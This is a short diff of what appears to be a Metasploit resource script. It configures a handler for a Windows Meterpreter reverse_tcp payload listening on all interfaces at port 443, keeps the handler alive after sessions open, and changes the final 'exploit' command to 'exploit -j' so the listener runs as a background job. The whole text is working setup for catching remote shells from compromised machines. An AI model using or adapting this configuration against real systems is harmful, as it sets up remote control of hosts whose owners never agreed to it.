@@ -3,4 +3,4 @@ set payload windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 443
 set ExitOnSession false
-exploit
+exploit -j
